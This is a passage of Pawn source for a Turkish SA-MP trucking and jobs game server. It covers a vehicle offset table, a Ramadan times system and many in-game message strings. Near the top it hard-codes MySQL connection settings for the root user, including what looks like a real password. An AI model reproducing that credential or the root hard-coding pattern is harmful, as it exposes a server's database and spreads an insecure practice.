    {538, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {539, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {540, -0.9827, 2.5810, -0.1248, -1.0597, -2.7121, -0.0842},
    {541, -0.6055, 2.3378, -0.2108, -0.7826, -2.1992, 0.0913},
    {542, -0.9712, 2.6252, -0.0064, -0.8281, -2.9729, -0.0577},
    {543, -0.8414, 2.2904, 0.0719, -0.9831, -2.6214, -0.0116}, //fake front
    {544, -0.7346, 3.5720, 0.0200, -0.8597, -3.2242, -0.5918},
    {545, -0.4372, 1.6776, -0.0400, -0.7955, -2.0453, -0.2888},
    {546, -1.1294, 1.0702, 0.0719, -1.0580, -2.6948, 0.0719},
    {547, -0.9582, 2.5222, 0.0271, -0.9937, -2.5915, 0.0719},
    {548, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {549, -0.9264, 2.4914, 0.0271, -0.9070, -2.5802, 0.0271},
    {550, -1.0477, 2.5642, -0.1807, -1.0302, -2.6549, -0.1297},
    {551, -0.9334, 2.6344, -0.0448, -0.9785, -3.0524, 0.0366},
    {552, -0.8757, 3.0634, 0.3600, -0.9933, -2.9119, 0.4752},
    {553, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {554, -0.9409, 2.5345, 0.0600, -1.1112, -2.8095, 0.0651},
    {555, -0.9236, 1.1282, -0.0462, 0.0, 0.0, 0.0},
    {556, -0.9686, 2.5396, 0.5800, -1.1128, -2.8895, 0.7691},
    {557, -0.9886, 2.4796, 0.7000, -1.0904, -2.7699, 0.6871},
    {558, -0.9452, 2.0854, 0.0836, -0.9187, -2.4047, 0.3185},
    {559, -0.9037, 2.4333, -0.0168, -0.8819, -2.2910, 0.1482},
    {560, -0.9347, 2.5097, -0.2644, -0.9639, -2.2337, 0.1259},
    {561, -0.9157, 2.5754, -0.0857, -0.9317, -2.5444, -0.0191},
    {562, -0.9299, 2.3759, 0.0201, -0.8575, -2.2773, 0.1659},
    {563, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {564, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {565, -0.8503, 2.0545, 0.0346, -0.9249, -1.9224, 0.0816},
    {566, -0.9539, 2.7226, 0.0346, -0.9506, -2.9199, 0.0346},
    {567, -0.9942, 2.9212, -0.1543, -1.0077, -2.9164, -0.1543},
    {568, -0.2962, 2.0729, -0.0171, -0.2384, -1.2180, 0.0720},
    {569, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {570, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {571, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {572, -0.3095, 0.7291, -0.0971, -0.4318, -0.8940, -0.0510},
    {573, -0.7949, 3.0624, -0.3371, -0.8727, -3.0917, -0.4540},
    {574, -0.4348, 1.6912, -0.2171, -0.4277, -1.1358, -0.2069},
    {575, -0.9483, 2.3252, 0.1334, -0.9173, -2.7359, -0.0291},
    {576, -0.9948, 2.4505, 0.1883, -0.9983, -3.1357, -0.0291},
    {577, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {578, -1.0478, 4.3687, -0.1800, -1.1188, -5.3472, -0.5099},
    {579, -1.0598, 2.3634, 0.1013, -1.0873, -2.7596, 0.1013},
    {580, -0.7970, 2.6313, -0.2429, -1.0776, -2.8302, 0.1013},
    {581, 0.0, 0.0, 0.0, -0.1975, -1.0375, 0.3448},
    {582, -0.8583, 2.4404, -0.0571, -0.9214, -3.3625, 0.0521},
    {583, -0.5225, 1.3799, 0.2429, -0.5486, -1.5684, 0.2462},
    {584, 0.0, 0.0, 0.0, -1.0452, -4.3338, -0.7298}, //trailer
    {585, -1.0068, 2.7905, 0.0907, -0.9760, -3.0160, 0.2088},
    {586, -0.2872, 0.5383, 0.2009, -0.1703, -1.3533, 0.2784},
    {587, -1.0236, 2.1415, -0.2834, -1.0832, -2.4851, 0.1047},
    {588, -1.0116, 3.3590, 0.1029, -1.0679, -3.9639, -0.3029},
    {589, -0.8107, 2.3905, 0.1834, -0.9605, -2.2799, 0.3761},
    {590, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {591, 0.0, 0.0, 0.0, -1.0590, -3.9902, -1.0809}, //trailer
    {592, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {593, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {594, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {595, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {596, -1.0419, 2.2929, -0.0255, -1.0332, -2.6951, 0.0005},
    {597, -1.0419, 2.2929, -0.0255, -1.0332, -2.6951, 0.0005},
    {598, -1.0423, 2.3495, 0.0600, -1.0326, -2.6930, 0.0600},
    {599, -1.0837, 2.5663, 0.0301, -1.1267, -2.6290, 0.1451},
    {600, -0.8782, 2.6525, -0.0344, -1.0586, -2.6696, 0.0596},
    {601, -0.8094, 3.0084, 0.5429, -0.9321, -3.0808, 0.9071},
    {602, -1.0297, 2.0487, -0.0543, -0.8907, -2.5334, -0.3228},
    {603, -0.9069, 2.6672, -0.1335, -0.8647, -2.5991, -0.1335},
    {604, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {605, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {606, 0.0, 0.0, 0.0, -0.5702, -1.5842, 0.7956}, //trailer
    {607, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {608, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {609, -0.8972, 3.0244, 0.2629, -0.9349, -2.9809, 0.2791},
    {610, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {611, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0}
    //END GTA CARS
};

#include "TM/Harita.pwn"

// ************************************************************************************************************************************************************
// Ramazan Vakitleri Sistemi ( By EvoturK )
// ************************************************************************************************************************************************************
#define MAX_RAMAZAN_SEHIR                   100
enum RSehirInfo
{
	rSehirName[50],
	rSehirImSaat,
	rSehirImDakika,
	rSehirIfSaat,
	rSehirIfDakika,
	bool:rSehirExist
};

new rSehir[MAX_RAMAZAN_SEHIR][RSehirInfo];
new Iterator:RSH<MAX_RAMAZAN_SEHIR>;
new bool:rSistemAktif = false;

new Text:UI_RamazanBaslik,
	Text:UI_RamazanSehir[7];


#define MYSQL_HOST                          "localhost"
#define MYSQL_USER                          "root"
#define MYSQL_PASS                          "Abdulkadir2204"
#define MYSQL_DB                            "truck"


new MySQL:Connection;
new OyuncununSilahlari[MAX_PLAYERS][12];



// ************************************************************************************************************************************************************
// Only function from dutils.inc
// ************************************************************************************************************************************************************

stock StripNewLine(string[])
{
	new len = strlen(string);
	if (string[0]==0) return ;
	if ((string[len - 1] == '\n') || (string[len - 1] == '\r')) {
		string[len - 1] = 0;
		if (string[0]==0) return ;
		if ((string[len - 2] == '\n') || (string[len - 2] == '\r')) string[len - 2] = 0;
	}
}



// ************************************************************************************************************************************************************
// PPC_DefTexts
// ************************************************************************************************************************************************************



// Debug messages
#define TXT_DebugInfo "Mod bilgilendirmesi:"
#define TXT_HousesFixed "%i adet ev duzeltildi."
#define TXT_LastVehicleID "Son yuklenen arac ID: %i"
#define TXT_LastObjectID "Son yuklenen obje ID: %i"
#define TXT_TotalHouses "Yuklenen ev sayisi: %i"
#define TXT_TotalBusiness "Yuklenen isyeri sayisi: %i"
#define TXT_TotalSpeedCameras "Yuklenen radar sayisi: %i"

// Define the message that's sent to all players when a player joins the server
#define TXT_PlayerJoinedServer "{009BFF}%s ({FFFFFF}%i{009BFF}) {FFFFFF}sunucuya girdi!"
#define TXT_PlayerLeftServer "{FFCC00}» {FFCC00}%s {FFFFFF}({FFCC00}%i{FFFFFF}) {FFFFFF}sunucudan ayrildi! %s"

// Banned texts (also kick messages)
#define TXT_StillBanned "{FFCC00}» {FFFFFF}Sunucuya giremezsiniz, banlanmissiniz!" // Define the text that the player sees when he's still banned when trying to login
#define TXT_BannedDuration "{FFCC00}» {FFFFFF}Kalan sure: %i gun, %i saat, %i dakika, %i saniye" // Define the remaining ban-time text
#define TXT_KickSpeedHack "{FFCC00}» {FFFFFF}Speed-hack veya Airbreak sebebiyle atildiniz."
#define TXT_KickJetPackHack "{FFCC00}» {FFFFFF}Jetpack-hack sebebiyle atildiniz!"
#define TXT_KickHealthHack "{FFCC00}» {FFFFFF}Health-hack sebebiyle atildiniz!"

#define TXT_DialogButtonCancel "Iptal" // Define the text on the "Cancel"-button for dialogs
#define TXT_DialogButtonBuy "Al" // Define the text on the "Buy"-button for dialogs
#define TXT_DialogButtonSpawn "Basla"
#define TXT_DialogButtonSelect "Sec"
#define TXT_DialogButtonYes "Evet"
#define TXT_DialogButtonNo "Hayir"

// Dialog entries
#define TXT_DialogEntryNext "Devam..."

// The register dialog
#define TXT_DialogRegisterTitle "{FFCC00}» {FFFFFF}Hos Geldiniz!" // Define the title-message on top of the register-dialog
#define TXT_DialogRegisterMsg "{FFCC00}»[TRUCK] {FFFFFF}Canakkale Meslek sunucusuna hosgeldiniz!\nLutfen {FFCC00}kayit {FFFFFF}olmak icin sifre giriniz:" // Define the actual message in the register-dialog
#define TXT_DialogRegisterButton1 "Kayit" // Define the text on the "register" button for the register-dialog
#define TXT_AccountRegistered "{FFCC00}» {FFFFFF}Basariyla hesabinizi yarattiniz, tebrikler!"
#define TXT_RegisterEnterValidPassword "{FFFFFF}Bir hata ile karsilastik!\nKayit olurken gecersiz sifre girdiniz.\nLutfen baska bir sifre seciniz:"
#define TXT_PlayerMustRegister "{FFCC00}» {FFFFFF}Oyuna katilmak icin kaydolmak zorunludur.\nSunucudan tekmelendiniz!"

// The login dialog
#define TXT_DialogLoginTitle "{FFCC00}» {FFFFFF}Merhaba!" // Define the title-message on top of the login-dialog
#define TXT_DialogLoginMsg "{FFCC00}» {FFFFFF}Sunucumuzda hesabiniz {FFCC00}kayitli {FFFFFF}gorunuyor!\nLutfen {FFCC00}60 saniye {FFFFFF}icinde sifrenizi girip giris yapiniz:" // Define the actual message in the login-dialog
#define TXT_DialogLoginButton1 "Giris" // Define the text on the "login" button for the login-dialog
#define TXT_LoggedIn "{FFCC00}» {FFFFFF}Basariyla giris yaptiniz, sizi tekrar gormek cok guzel!"
#define TXT_WrongPassword "{FFCC00}» {FFFFFF}Girdiginiz sifre hataliydi, sunucudan tekmelendiniz!"
#define TXT_LoginEnterValidPassword "{FFCC00}» {FFFFFF}Hesabiniz kayitli, lutfen sifreyi girip giris yapiniz:"
#define TXT_PlayerMustLogin "{FFCC00}» {FFFFFF}Oyuna katilmak icin giris yapmak zorunludur.\nSunucudan tekmelendiniz!"
#define TXT_FailedLoginProperly "{FFCC00}» {FFFFFF}Giris yaparken bir hata ile karsilasildi.\nSunucudan tekmelendiniz!"

// The license dialog
#define TXT_DialogLicenseTitle "Lisans ekrani:" // Define the title-message on top of the licenses-dialog
#define TXT_DialogLicenseList "TIR EHLIYETI (50.000$ | 100 skor)\nUÇAK EHLIYETI (150.000$ | 100 skor)\nOTOBUS EHLIYETI (25.000$ | 50 skor)\nGEMI EHLIYETI (150.000$ | 100 skor)\nMafia Lisansi (250.000$ | 200 skor)\nDOLMUS EHLIYETI (25.000$ | 50 skor)" // Define the licenses and their price
#define TXT_PickupText "Ehliyet al!" // Defines the text that's shown above the pickup for buying licenses
#define TXT_TruckerLicenseBought "{00FF00}Tirci lisansini basariyla aldiniz, tebrik ederiz!"
#define TXT_TruckerLicenseNotEnoughMoney "{FF0000}Bu lisansi almak icin yeterince paraniz/skorunuz bulunmamakta!"
#define TXT_TruckerLicenseOwned "{FF0000}Bu lisansi daha once almissiniz, tekrar alamazsiniz!"
#define TXT_TruckerLicenseWrongClass "{FF0000}Tirci lisansini alabilmek icin tir soforu olmalisiniz!"
#define TXT_BusLicenseBought "{00FF00}Otobus soforu lisansini basariyla aldiniz, tebrik ederiz!"
#define TXT_BusLicenseNotEnoughMoney "{FF0000}Bu lisansi almak icin yeterince paraniz/skorunuz bulunmamakta!"
#define TXT_BusLicenseOwned "{FF0000}Bu lisansi daha once almissiniz, tekrar alamazsiniz!"
#define TXT_BusLicenseWrongClass "{FF0000}Otobus soforu lisansini alabilmek icin otobus soforu olmalisiniz!"
#define TXT_PilotLicenseBought "{00FF00}Pilot Ehliyetini Aldin"
#define TXT_PilotLicenseNotEnoughMoney "{FF0000}Almak icin 250.000 Dollar ve 200 Skora ihtiyacin var"
#define TXT_PilotLicenseOwned "{FF0000}Zaten bunu Aldin"
#define TXT_PilotLicenseWrongClass "{FF0000}Bunu Almak icin Pilot olman lazim"
#define TXT_MafiaLicenseBought "{00FF00}Mafia Ehliyetini Aldin"
#define TXT_MafiaLicenseNotEnoughMoney "{FF0000}Almak icin 250.000 Dollar ve 200 Skora ihtiyacin var"
#define TXT_MafiaLicenseOwned "{FF0000}Zaten bunu Aldin"
#define TXT_MafiaLicenseWrongClass "{FF0000}Bunu Almak icin Mafia olman lazim"
#define TXT_DolmusLicenseBought "{00FF00}Dolmus soforu lisansini basariyla aldiniz, tebrik ederiz!"
#define TXT_DolmusLicenseNotEnoughMoney "{FF0000}Bu lisansi almak icin yeterince paraniz/skorunuz bulunmamakta!"
#define TXT_DolmusLicenseOwned "{FF0000}Bu lisansi daha once almissiniz, tekrar alamazsiniz!"
#define TXT_DolmusLicenseWrongClass "{FF0000}Dolmus soforu lisansini alabilmek icin dolmus soforu olmalisiniz!"

// Dialog related for /car, /plane, ...
#define TXT_DialogCarTitle "Araç Seçin (sayfa %i):"
#define TXT_DialogPlaneTitle "Hava Aracý Seçin (sayfa %i):"
#define TXT_DialogTrailerTitle "Kasa Seçin (sayfa %i):"
#define TXT_PlayerSpawnedVehicle "{00FF00}"
#define TXT_ChangedWeather "{00FF00}Havayý deðiþtirdiniz"
#define TXT_DialogCommandTitle "{FFCC00}» {FFFFFF}Komut Listesi (sayfa %i):"

// Trucker related
#define TXT_PlayerCompletedTruckJob "{00ff00}%s {FFFFFF}rumuzlu týr þoförü baþarýyla {00ff00}%s {FFFFFF}yükünü taþýdý!"
#define TXT_PlayerCompletedTruckJobInfo "{FFFFFF}Yükleme Noktasý: {00FF00}%s {FFFFFF}Boþaltma Noktasý: {00FF00}%s"
#define TXT_TruckerBonusOverloaded "{00FF00}Asiri yuk araciligiyla %i$ kazandiniz!"
#define TXT_TruckerBonusMafiaLoad "{00FF00}Mafya tasimaciligi araciligiyla %i$ kazandiniz!"
#define TXT_TruckerBonusOwnVehicle "{00FF00}Kendi tirinizla yuk tasidiginiz icin %i$ kazandiniz!"
#define TXT_TruckerMustEnterVehicle "{FF0000}Lutfen araciniza geri donun veya dorsenizi araciniza takin!"
#define TXT_TruckerOverloaded "{FF0000}Asiri yuk aldiniz, mafyalar pesinizde olacaktir, dikkatli olun!"
#define TXT_TruckerMafiaInterested "~r~Mafya yukunuze ilgi duyuyor, dikkat edin!~w~"
#define TXT_TruckerDialogSelectLoad "Ne tasimak istiyorsunuz:"
#define TXT_TruckerDialogSelectStartLoc "Nereden alacaksiniz:"
#define TXT_TruckerDialogSelectEndLoc "Nereye gotureceksiniz:"
#define TXT_NeedVehicleToProceed "{FF0000}Ilerlemek icin araca ihtiyaciniz var!"
#define TXT_NeedTrailerToProceed "{FF0000}Ilerlemek icin dorseye ihtiyaciniz var!"
#define TXT_NeedOnFootToProceed "{FF0000}Ilerlemek icin yurumeniz gerekmekte!"

// Mafia related
#define TXT_PlayerCompletedMafiaJob "{FF00FF}%s {FFFFFF}rumuzlu mafya uyesi {0000FF}%s {FFFFFF}gorevini basariyla tamamladi!"
#define TXT_PlayerCompletedMafiaJobInfo "Goreviniz yuku {00FF00}%s {FFFFFF}bolgesinden alip {00FF00}%s {FFFFFF}bolgesine ulastirmak!"
#define TXT_MafiaMustEnterVehicle "{FF0000}Aracta olmak zorundasiniz!"
#define TXT_MafiaDeliverStolenLoad "~w~Lutfen ~b~calinti yuku~w~ ~r~mafya bolgesine ~w~ulastirin!"
#define TXT_MafiaDeliveredStolenLoad "{00FF00}Calinti yuk basariyla mafya bolgesine getirildi, $5000 kazandiniz!"
#define TXT_MafiaDialogSelectLoad "Yuku Secin:"
#define TXT_MafiaDialogSelectStartLoc "Yukleme Yerini Secin:"
#define TXT_MafiaDialogSelectEndLoc "Brakma Yerini Seciniz:"


// Police related
#define TXT_PoliceWarnPlayer "~b~>>! ~b~~h~P~h~O~h~L~h~I~h~S ~b~!<<~n~~w~Aracinizi saga cekin!"
#define TXT_PoliceFinedPlayerReward "{FFCC00}» {FFCC00}%s {FFFFFF}rumuzlu oyuncuya para cezasi kestiniz. {FFCC00}$%i {FFFFFF}kazandiniz!"
#define TXT_PlayerGotFinedByPolice "{FFCC00}» {FFCC00}%s {FFFFFF}Tarafiniza Polis Tarafindan {FFCC00}%i {FFFFFF}Ceza Kesildi." // YANLIS TEXT {FF0000}%s rumuzlu oyuncuyu yakaladiniz ve bunun sonucunda $%i kazandiniz!
#define TXT_PoliceFinedPlayer "{FFCC00}» {FFFFFF}Polis memuru {FFCC00}%s, %s {FFFFFF}rumuzlu oyuncuya para cezasi kesti!"
#define TXT_PoliceJailedPlayerReward "{FFCC00}» {FFCC00}%s rumuzlu oyuncuyu adalete teslim ettiniz ve bunun sonucunda {FFCC00}$%i {FFFFFF}kazandiniz!"
#define TXT_PlayerGotJailedByPolice "{FFCC00}» {FFFFFF}Polis memuru {FFCC00}%s {FFFFFF}tarafindan {FFCC00}%i {FFFFFF}dakikaligina hapse gonderildiniz!"
#define TXT_PoliceJailedPlayer "{FFCC00}» {FFFFFF}Polis memuru {FFCC00}%s, %s {FFFFFF}rumuzlu oyuncuyu {FFCC00}%i {FFFFFF}dakikaligina hapse gonderdi!"

//FBY related

#define TXT_FBYWarnPlayer "~r~Cevik Kuvvet Teslim Olun ! Aracinizi durdurun !~w~"

#define TXT_FBYFinedPlayerReward "{00FF00}%s rumuzlu oyuncuya para cezasi kestiniz. $%i kazandiniz!"

#define TXT_PlayerGotFinedByFBY "{81DAF5}%s Tarafiniza Cevik Kuvvet Tarafindan %i Ceza Kesildi."

#define TXT_FBYFinedPlayer "{2E2EFE}Cevik Kuvvet %s, %s rumuzlu oyuncuya para cezasi kesti!"

#define TXT_FBYJailedPlayerReward "{2E2EFE}%s rumuzlu oyuncuyu adalete teslim ettiniz ve bunun sonucunda $%i kazandiniz!"

#define TXT_PlayerGotJailedByFBY "{FF0000}Cevik Kuvvet %s tarafindan %i dakika hapse gonderildiniz!"

#define TXT_FBYJailedPlayer "{00FF00}Cevik Kuvvet %s, %s rumuzlu oyuncuyu %i dakikaligina hapse gonderdi!"

// Pilot related
#define TXT_PlayerCompletedPilotJob "{00ff00} %s {FFFFFF} rumuzu pilot {00ff00}%s {FFFFFF}gorevini basariyla tamamladi!"
#define TXT_PlayerCompletedPilotJobInfo "Goreviniz ucagi {00FF00}%s {FFFFFF}bolgesinde yukletip {00FF00}%s {FFFFFF}bolgesine ulastirmak!"
#define TXT_PilotDialogSelectLoad "Yuku Secin:"
#define TXT_PilotDialogSelectStartLoc "Yukleme Yerini Secin:"
#define TXT_PilotDialogSelectEndLoc "Brakma Yerini Seciniz:"

// Gunoier related

#define TXT_PlayerCompletedGJob "{CE576D}Belediye Copcusu %s Sehiri Temiz Tutmak icin Basariyla Bolgeyi Temizledi "
#define TXT_PlayerCompletedGJobInfo ""

// Bankaci related

#define TXT_PlayerCompletedBankaJob "{BAAFAF}Bankaci %s Basariyla Para Tasima Gorevini bitirdi "
#define TXT_PlayerCompletedBankaJobInfo ""

//fire relate
#define TXT_PlayerCompletedFireJob "{A511E9}Itfaiyeci %s Basariyla Yangin Sondurme Gorevini bitirdi "
#define TXT_PlayerCompletedFireJobInfo ""
#define TXT_LoadingGoodsFire "~r~%s'i Sondurun"
#define TXT_UnloadingGoodsFire "~r~%s Gorevi Sonlaniyor"
#define TXT_PickupCargoAtFire "{FFFFFF}MERKEZ : {00FF00}%s Cikti {FFFFFF} - {FF0000}%s'ye Acilen Git "
#define TXT_DeliverCargoToFire "{00FF00}%s'i Sondur ve {FFFFFF} - {FF0000}%s 'ye Geri Don "

// Roadworker related
#define TXT_RepairSpeedcamera "~r~Bozuk radarlari ~w~tamir ediniz!"
#define TXT_TowBrokenVehicle "~r~Bozuk araci ~w~cekin ve ~b~%s parcalama istasyonu~w~na goturun!"
#define TXT_DeliverBrokenVehicle "~r~Bozuk araci ~w~cekin ve ~b~%s parcalama istasyonu~w~na goturun!"
#define TXT_RoadworkerMustEnterVehicle "{FF0000}Araciniza geri donun!"
#define TXT_RoadworkerMissionPassed "Gorev basariyla tamamlandi!" // Define the game-text that shows when the player passed a roadworker mission

// Job related, for all classes
#define TXT_RewardJob "{00FF00}Gorev tamamlandi! $%i kazandiniz!"
#define TXT_FailedMission "~r~Gorev Basarisiz! ~w~$1000 kaybettiniz!" // Define game-text when player fails a mission

//Pizza Boy related

#define TXT_PboyMustEnterVehicle "{FF0000}Aracin icinde olmalisin"
#define TXT_PlayerCompletedPboyJob "{FFFFFF}Pizzaci {FB8DC0}%s{FFFFFF} Basariyla {FFFF00}%i{FFFFFF} Pizza dagiti"
#define TXT_PackageDeliveredpizzaGameText "Pizza Teslim edildi"
#define TXT_PackageDeliveredpizzaMessage "{FB8DC0}Pizza Teslim edildi"


// Class related
#define TXT_ClassTrucker "TIR SOFORU" // Define the game-text that shows when the player is choosing classes (this one = trucker)
#define TXT_ClassBusDriver "OTOBUS SOFORU" // Define the game-text that shows when the player is choosing classes (this one = bus-driver)
#define TXT_ClassPilot "PILOT" // Define the game-text that shows when the player is choosing classes (this one = pilot)
#define TXT_ClassPolice "POLIS" // Define the game-text that shows when the player is choosing classes (this one = police)
#define TXT_ClassMafia "MAFYA" // Define the game-text that shows when the player is choosing classes (this one = mafia)
#define TXT_ClassRoadWorker "YOL ISCISI" // Define the game-text that shows when the player is choosing classes (this one = roadworker)
#define TXT_ClassGemici "GEMICI" // Define the game-text that shows when the player is choosing classes (this one = roadworker)
#define TXT_ClassOduncu "ODUNCU" // Define the game-text that shows when the player is choosing classes (this one = roadworker)
#define TXT_ClassBalikci "BALIKCI" // Define the game-text that shows when the player is choosing classes (this one = roadworker)
#define TXT_ClassCopcu "Copcu" // Define the game-text that shows when the player is choosing classes (this one = Gunoier)
#define TXT_ClassBanka "Bankaci" // Define the game-text that shows when the player is choosing classes (this one = Gunoier)
#define TXT_ClassFire "Itfaiyeci" // Define the game-text that shows when the player is choosing classes (this one = Gunoier)
#define TXT_ClassFBY "Cevik Kuvvet" // Define the game-text that shows when the player is choosing classes (this one = FBY)
#define TXT_ClassPboy "PIZZACI" // Define the game-text that shows when the player is choosing classes (this one = Pizza Boy)
#define TXT_ClassDolmus "Dolmus Soforu" // Define the game-text that shows when the player is choosing classes (this one = Pizza Boy)


// Command related
#define TXT_PlayerRescued "{FFCC00}» {FFFFFF}Mesleðinize ait bir baþlangýç noktasýna ýþýnlandýnýz."


// Fuel related
#define TXT_Refuelling "~g~De~h~po ~h~doldur~h~uluy~h~or!" // Define the game-text that shows when you're refuelling your vehicle
#define TXT_PickupRefuel "- Canakkale Meslek Sunucusu BENZIN ISTASYONU -\nDeponuzu doldurmak icin kornaya basin! ( H )"
#define TXT_RefuelledVehicle "{00FF00}Deponuzu $%i karsiliginda fullediniz!"
#define TXT_CannotRefuelVehicle "{FF0000}Yeterince paraniz yok!"

// Gametexts for loading/unloading
#define TXT_LoadingGoods "~r~Dolduruluyor! %s..."
#define TXT_UnloadingGoods "~r~Bosaltiliyor! %s..."
#define TXT_TruckerLoadingGoods "~r~Tiriniz dolduruluyor! ~w~Lutfen bekleyin!"
#define TXT_TruckerUnloadingGoods "~r~Tiriniz bosaltiliyor! ~w~Lutfen bekleyin!"
#define TXT_PickupCargoAt "{FFFFFF}Kargo Teslimat Noktalari : {00FF00}%s {FFFFFF} - {FF0000}%s "
#define TXT_DeliverCargoTo "{FFFFFF}Kargo Teslimat Noktalari : {00FF00}%s {FFFFFF} - {FF0000}%s "

// Cardealer related
#define TXT_PickupCarDealer "Arac kiralamak icin \"/rentcar\"\nkomutunu kullanin"
#define TXT_BuyRentCarEmptyList "{FF0000}Bu liste bos, admin bu sinifinizdeki kisilere arac kiralamaya yasaklamis olabilir"
#define TXT_RentBike "Motorsiklet kirala:"
#define TXT_RentBoat "Bot kirala:"
#define TXT_RentConvertible "Ustu acilan araba kirala:"
#define TXT_RentHelicopter "Helikopter kirala:"
#define TXT_RentIndustrial "Endustriyel arac kirala:"
#define TXT_RentLowRider "Low-rider kirala:"
#define TXT_RentOffRoad "Off-road araci kirala:"
#define TXT_RentPlane "Ucak kirala:"
#define TXT_RentPublicService "Toplum hizmeti araci kirala:"
#define TXT_RentRC "RC arac kirala:"
#define TXT_RentSaloon "Luks arac kirala:"
#define TXT_RentSport "Spor arac kirala:"
#define TXT_RentStationWagon "Istasyon vagonu kirala:"
#define TXT_RentTrailer "Kasa kirala:"
#define TXT_RentUnique "Benzersiz arac kirala:"
#define TXT_AlreadyRentedVehicle "{FFCC00}» {FFFFFF}Zaten arac kiralamissin, fakat yenisiyle degistirdik"
#define TXT_PlayerRentsVehicle "{00FF00}Sen {FFFF00}%s{00FF00} i ${FFFF00}%i{00FF00} a kiraladin"
#define TXT_RentingTooExpensive "{FFCC00}» {FFFFFF}Bu araci kiralamaya paran yok"
#define TXT_BuyBike "Bisikletler:"
#define TXT_BuyBoat "Botlar::"
#define TXT_BuyConvertible "Diger Araclar:"
#define TXT_BuyHelicopter "Helikopterler::"
#define TXT_BuyIndustrial "Meslek Araclari:"
#define TXT_BuyLowRider "Eski Modifiye Araclar:"
#define TXT_BuyOffRoad "Dag Araclari:"
#define TXT_BuyPlane "Ucaklar:"
#define TXT_BuyPublicService "Tavsiye Edilen Araclar:"
#define TXT_BuyRC "Oyuncak Araclar:"
#define TXT_BuySaloon "Vagon Tipi Araclar:"
#define TXT_BuySport "Spor Araclar:"
#define TXT_BuyStationWagon "Vagon Tipi Araclar2:"
#define TXT_BuyTrailer "Kasalar:"
#define TXT_BuyUnique "Diger:"



// Jail related
#define TXT_JailTimer "~w~Hapis: ~r~%i~w~"

// Speedometer related
#define TXT_SpeedometerSpeed "~w~Hiz: ~b~%i ~w~KM/H"
#define TXT_SpeedometerFuel "~w~Benzin: %s"
#define TXT_SpeedometerCannotUseVehicle "{FFCC00}» {FFFFFF}Bu Arac Sizin Degil. Sahibi : \"{FFFF00}%s{FF0000}\""
#define TXT_SpeedometerClampedVehicle "{FFCC00}» {FFFFFF}Bu araba yakalanmis, kullanamassin"
#define TXT_SpeedometerClampedVehicle2 "{FFCC00}» {FFFFFF}/unclamp {FFFFFF}yazarak aracini kurtarabilirsin"
#define TXT_PlayerCaughtSpeeding "{FFCC00}» {FFFFFF}Radara Yakalandýn. (Senin Hýzýn : {FFCC00}%d km/h |{FFFFFF} Hýz Limiti: {FFCC00}%d km/h)"


// Toll-gate related
#define TXT_PlayerPaysToll "~r~U~h~c~h~r~h~e~h~t~h~l~h~i Y~h~o~h~l:~w~ %i $"

// Convoy related
#define TXT_PlayerStartsConvoy "Oyuncu {00FF00}%s{FFFFFF} {00FF00}Konvoy{FFFFFF} kurdu, katilmak icin \"/convoy\" yazin."
#define TXT_PlayerJoinedConvoy "Oyuncu {00FF00}%s{FFFFFF} Konvoyunuza Katildi"
#define TXT_YouJoinedConvoy "{FFCC00}» {FFFFFF}Konvoya Katildiniz."
#define TXT_WaitingLeaderJob "{FFCC00}» {FFFFFF}Konvoy Liderinin Gorev Baslatmasi Bekleniyor."
#define TXT_WaitingMembersToLoadCargo "{FFCC00}» {FFFFFF}Tum Uyelerin Mal Yuklemesi Bekleniyor."
#define TXT_WaitingMembersToUnLoadCargo "{FFCC00}» {FFFFFF}Tum Uyelerin Mal Bosaltmasi Bekleniyor."
#define TXT_ConvoyFull "{FFCC00}» {FFFFFF}Bu Konvoy {FF0000} DOLU !"
#define TXT_ConvoyEnRoute "{FFCC00}» {FFFFFF}Konvoy Goreve Baslamis , Bitmeden Katilamassiniz."
#define TXT_LeaderCancelledConvoy "{FFCC00}» {FFFFFF}Konvoy Kapatildi."
#define TXT_MeetOtherConvoyMembers "{FFCC00}» {FFFFFF}Yukleme Yerinde Konvoy Uyeleriyle Tanisabilirsiniz."
#define TXT_ConvoyDistanceForLeader "{00FF00} Dikkat : Uyeler 500m Yakininzda Olmali."
#define TXT_ConvoyDistanceForMember "{FFCC00}» {FFFFFF}Dikkat : Lidere {FFCC00}500m {FFFFFF}Yakinda Kalin."
#define TXT_MemberNeedsCargoTrailer "{FFCC00}» {FFFFFF}Kapali Kasa Gerekli."
#define TXT_MemberNeedsOreTrailer "{FFCC00}» {FFFFFF}Benzin Kasasi Gerekli."
#define TXT_MemberNeedsFluidsTrailer "{FFCC00}» {FFFFFF}Kum Kasasi Gerekli."
#define TXT_AllMembersSameTrailer "{FFCC00}» {FFFFFF}Konvoy göreve baþlamaya hazýr."
#define TXT_AllMembersNotSameTrailer "{FF0000}Konvoy bütün üyeler sizinle ayný aracý veya kasayý alasýya kadar göreve baþlayamayacak!"
#define TXT_AllMembersLoadedCargo "{FFCC00}» {FFFFFF}Tum üyeler yük aldý. Devam edebilirsiniz."
#define TXT_MemberKickedByDistance "{FFCC00}» {FFFFFF}Konvoy liderinden çok uzaklaþtýðýnýz için konvoydan atýldýnýz"
#define TXT_MemberFellBehind "Oyuncu {00FF00}%s{FFFFFF} konvoydan çok uzak kaldý ve atýldý."
#define TXT_FinishedConvoy "{FFCC00}» {FFFFFF}Konvoy Görevi Bitti. Kazanç {FFCC00}$%i"
